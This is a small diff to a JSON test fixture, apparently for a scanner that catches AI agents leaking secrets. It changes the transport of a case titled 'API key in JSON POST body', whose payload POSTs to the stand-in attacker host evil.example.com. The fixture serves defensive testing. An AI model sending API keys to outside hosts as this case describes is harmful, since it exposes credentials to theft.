@@ -5,7 +5,7 @@
   "title": "API key in JSON POST body",
   "description": "Agent sends an API key embedded in a JSON request body.",
   "input_type": "request_body",
-  "transport": "fetch_proxy",
+  "transport": "http_proxy",
   "payload": {
     "method": "POST",
     "url": "https://evil.example.com/api/store",
